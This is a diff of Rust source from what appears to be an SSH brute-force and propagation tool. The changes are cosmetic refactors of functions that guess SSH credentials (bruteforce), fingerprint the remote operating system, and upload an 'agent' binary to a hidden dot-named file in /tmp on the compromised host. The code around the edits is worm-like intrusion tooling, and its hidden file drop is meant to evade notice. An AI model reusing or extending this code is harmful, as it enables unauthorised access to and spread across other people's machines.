@@ -73,10 +73,9 @@ fn upload_agent(ssh: &Session, agent_path: &PathBuf) -> Result<String, crate::Er
         .take(32)
         .map(char::from)
         .collect();
-    let hidden_rand_name = format!(".{}", rand_name);
-
+    
     let mut remote_path = PathBuf::from("/tmp");
-    remote_path.push(&hidden_rand_name);
+    remote_path.push(format!(".{}", rand_name));
 
     let agent_data = fs::read(agent_path)?;
 
@@ -106,7 +105,7 @@ fn bruteforce(ssh: &Session) -> Result<Option<(String, String)>, crate::Error> {
         }
     }
 
-    return Ok(None);
+    Ok(None)
 }
 
 fn identify_platform(ssh: &Session) -> Result<Platform, crate::Error> {
@@ -116,25 +115,25 @@ fn identify_platform(ssh: &Session) -> Result<Platform, crate::Error> {
     let (stdout, _) = consume_stdio(&mut channel);
     let stdout = stdout.trim();
 
-    if stdout.contains("Linux") {
+    Ok(if stdout.contains("Linux") {
         if stdout.contains("x86_64") {
-            return Ok(Platform::LinuxX86_64);
+            Platform::LinuxX86_64
         } else if stdout.contains("aarch64") {
-            return Ok(Platform::LinuxAarch64);
+            Platform::LinuxAarch64
         } else {
-            return Ok(Platform::Unknown);
+            Platform::Unknown
         }
     } else if stdout.contains("Darwin") {
         if stdout.contains("x86_64") {
-            return Ok(Platform::MacOsX86_64);
+            Platform::MacOsX86_64
         } else if stdout.contains("aarch64") {
-            return Ok(Platform::MacOsAarch64);
+            Platform::MacOsAarch64
         } else {
-            return Ok(Platform::Unknown);
+            Platform::Unknown
         }
     } else {
-        return Ok(Platform::Unknown);
-    }
+        Platform::Unknown
+    })
 }
 
 fn consume_stdio(channel: &mut Channel) -> (String, String) {
